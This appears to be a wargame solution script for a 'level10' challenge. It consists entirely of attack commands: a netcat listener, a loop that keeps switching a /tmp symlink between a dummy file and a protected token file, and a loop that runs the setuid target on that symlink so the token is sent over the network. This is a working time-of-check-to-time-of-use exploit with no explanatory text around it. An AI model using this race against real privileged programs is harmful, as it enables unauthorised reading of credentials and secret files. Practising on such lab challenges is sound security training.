nc -lk 6969

while true; do
    ln -sf /tmp/dummy /tmp/pwn
    ln -sf /home/user/level10/token /tmp/pwn
done

while true; do
    /home/user/level10/level10 /tmp/pwn 127.0.0.1
done